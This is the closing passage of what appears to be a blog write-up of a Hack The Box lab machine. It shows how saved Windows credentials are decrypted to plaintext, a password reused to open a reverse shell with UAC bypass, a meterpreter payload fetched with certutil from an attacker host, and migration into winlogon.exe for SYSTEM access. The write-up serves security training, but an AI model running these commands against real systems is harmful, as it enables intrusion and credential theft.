</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=n>S</span> <span class=n>N</span><span class=p>=</span><span class=s2>&#34;UserName&#34;</span><span class=p>&gt;</span><span class=n>alaading</span><span class=p>&lt;/</span><span class=n>S</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=n>SS</span> <span class=n>N</span><span class=p>=</span><span class=s2>&#34;Password&#34;</span><span class=p>&gt;</span><span class=n>01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</span><span class=p>&lt;/</span><span class=n>SS</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=n>Props</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=n>Obj</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=n>Objs</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>alaading <strong>PSCredentials for winRM</strong> exported on a <strong>xml file.</strong></p><p>I have been able to see the <strong>plaintext passwords</strong> with the following commands</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$credential</span> <span class=p>=</span> <span class=nb>Import-CliXml</span> <span class=n>-Path</span>  <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>sfitz</span><span class=p>\</span><span class=n>Documents</span><span class=p>\</span><span class=n>connection</span><span class=p>.</span><span class=py>xml</span>
</span></span><span class=line><span class=cl><span class=nv>$credential</span><span class=p>.</span><span class=py>GetNetworkCredential</span><span class=p>().</span><span class=py>Password</span>
</span></span></code></pre></div><h2 id=user-pivoting-as-alaading>User Pivoting as alaading<a hidden class=anchor aria-hidden=true href=#user-pivoting-as-alaading>#</a></h2><p>Lets switch the user with <strong>RunasCS.exe</strong>, I used the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.\</span><span class=n>RunasCS</span><span class=p>.</span><span class=py>exe</span> <span class=n>alaading</span> <span class=n>f8gQ8fynP44ek1m3</span> <span class=n>cmd</span><span class=p>.</span><span class=py>exe</span> <span class=n>-r</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>150</span><span class=err>:</span><span class=mf>5555</span> <span class=p>-</span><span class=n>-bypass-uac</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/pov-10.png></p><p><img alt=Untitled loading=lazy src=/HTB/pov-11.png></p><p>As always lets check the current <strong>privileges.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>whoami</span> <span class=p>/</span><span class=n>priv</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>PRIVILEGES</span> <span class=n>INFORMATION</span>
</span></span><span class=line><span class=cl><span class=p>----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Privilege</span> <span class=n>Name</span>                <span class=n>Description</span>                    <span class=n>State</span>   
</span></span><span class=line><span class=cl><span class=p>=============================</span> <span class=p>==============================</span> <span class=p>========</span>
</span></span><span class=line><span class=cl><span class=n>SeDebugPrivilege</span>              <span class=n>Debug</span> <span class=n>programs</span>                 <span class=n>Disabled</span>
</span></span><span class=line><span class=cl><span class=n>SeChangeNotifyPrivilege</span>       <span class=n>Bypass</span> <span class=n>traverse</span> <span class=n>checking</span>       <span class=n>Enabled</span> 
</span></span><span class=line><span class=cl><span class=n>SeIncreaseWorkingSetPrivilege</span> <span class=n>Increase</span> <span class=n>a</span> <span class=k>process</span> <span class=n>working</span> <span class=nb>set </span><span class=n>Enabled</span>
</span></span></code></pre></div><p>Awesome, we have <strong>seDebugPrivilege</strong> but its appears <strong>disabled</strong> </p><h2 id=privilege-escalation-with-sedebugprivilege>Privilege Escalation with seDebugPrivilege<a hidden class=anchor aria-hidden=true href=#privilege-escalation-with-sedebugprivilege>#</a></h2><p>A quick <strong>search on google</strong> gives me the clue of what I need to turn it on. Thanks to an <strong>Hacktricks post</strong> about <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#enable-all-the-tokens>Abusing Tokens</a> I found a ps1 <a href=https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1>module</a> for enabling all the tokens.</p><p>Once executed <strong>the privilege still disabled</strong> but we will try to abuse the <strong>seDebugPrivilege</strong> anyway.</p><p>One form of abusing this token and the easiest one is by <strong>setting a meterpreter reverse shell</strong> on the current machine and <strong>migrate our current process</strong> to the <strong>winlogon.exe process</strong> with <strong>metasploit.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.150 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4446</span> -f exe &gt; met.exe
</span></span></code></pre></div><p>The above command generates a <strong>meterpreter shell</strong> in a .exe format, we can <strong>download it with certutil.exe</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>certutil</span><span class=p>.</span><span class=py>exe</span> <span class=n>-urlcache</span> <span class=o>-f</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>150</span><span class=p>/</span><span class=n>met</span><span class=p>.</span><span class=py>exe</span> <span class=n>met</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p>Once downloaded lets set the <strong>meterpreter listener</strong> with <code>exploit/multi/handler</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>msfconsole</span> <span class=n>-x</span> <span class=s2>&#34;use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.14.150;set LPORT 4446;run;&#34;</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/pov-12.png></p><p>We have a <strong>shell</strong> lets list the <strong>current processes</strong> with <code>ps</code></p><p><img alt=Untitled loading=lazy src=/HTB/pov-13.png></p><p><strong>winlogon.exe</strong> has the <strong>uid 556</strong>, lets use <code>migrate 556</code></p><p><img alt=Untitled loading=lazy src=/HTB/pov-14.png></p><p><strong>We have migrated</strong> the current process succesfully.</p><p>By creating a <strong>shell</strong>, we can confirm that we are <code>NT/AUTHORITY SYSTEM</code> now.</p><p><img alt=Untitled loading=lazy src=/HTB/pov-15.png></p><p><img alt=Untitled loading=lazy src=/HTB/pov-16.png></p><p><strong>Thank you for reading, and happy hacking! </strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/web/>Web</a></li><li><a href=https://pwndside.github.io/tags/windows/>Windows</a></li><li><a href=https://pwndside.github.io/tags/serialized/>Serialized</a></li><li><a href=https://pwndside.github.io/tags/wintokens/>Wintokens</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> 路
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>